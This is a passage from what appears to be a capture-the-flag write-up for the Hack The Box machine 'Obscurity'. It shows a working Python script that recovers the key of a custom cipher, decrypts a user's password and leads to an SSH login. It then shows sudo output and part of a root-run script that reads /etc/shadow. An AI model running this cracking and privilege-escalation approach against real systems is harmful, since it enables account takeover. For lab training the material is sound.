        &lt;span class=&quot;n&quot;&gt;decrypted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Writing to {0}...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'w'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encoding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'UTF-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decrypted&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The following was what I came up with, which successfully reversed the encryption, output the key and password. Aptly named, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SuperDecryptor.py&lt;/code&gt;. I included a few comments to describe what it is doing.&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;string&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Vars
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# Holds the Key!
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# Looping
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;isCrack&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Files from Robert's Directory
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;checkFile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'check.txt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;outFile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'out.txt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;passFile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'passwordreminder.txt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'r'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Slightly Modified Decrypt Function From SuperSecureCrypt.py
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;keyPos&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;decrypted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;newChr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;keyPos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;decrypted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;newChr&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;keyPos&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;keyPos&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;keyPos&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decrypted&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;isCrack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# Keep looping until it's cracked
&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;printable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# For each printable character
&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;decCompare&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;outFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# Decrypt each char concat'd with key string 
&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;checkFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decCompare&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# If we have a match...
&lt;/span&gt;            &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# Add the character to the key string 
&lt;/span&gt;            &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# Increment index counter
&lt;/span&gt;            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;checkFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decCompare&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# See if we're done
&lt;/span&gt;                &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[+] The Super Secret Key is: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;isCrack&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt; 

&lt;span class=&quot;c1&quot;&gt;# Decrypt Robert's Password Reminder File with the key
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[+] Robert&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s Decrypted Password: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;passFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We have a password! Let’s see if it works.
&lt;img src=&quot;\assets\images\htb\obscurity\super-decryptor.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This allows us to log in with SSH as Robert and grab the user flag!
&lt;img src=&quot;\assets\images\htb\obscurity\obscurity-user.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Within the BetterSSH directory in Robert’s home folder, I saw a BetterSSH.py script owned by root.&lt;/p&gt;

&lt;p&gt;In addition, we can run it as root:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;robert@obscure:~/BetterSSH&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;robert on obscure:
    env_reset, mail_badpass, &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin

User robert may run the following commands on obscure:
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;BetterSSH.py&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;crypt&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;traceback&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;subprocess&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;choices&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ascii_letters&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;digits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;user&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;authenticated&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'user'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter username: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;passW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter password: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/etc/shadow'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'r'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;$&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;passwords&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;passwords&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;passwordFile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passwords&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; 
    &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/tmp/SSH/'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'w'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;passwordFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;salt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;realPass&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passwords&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'user'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
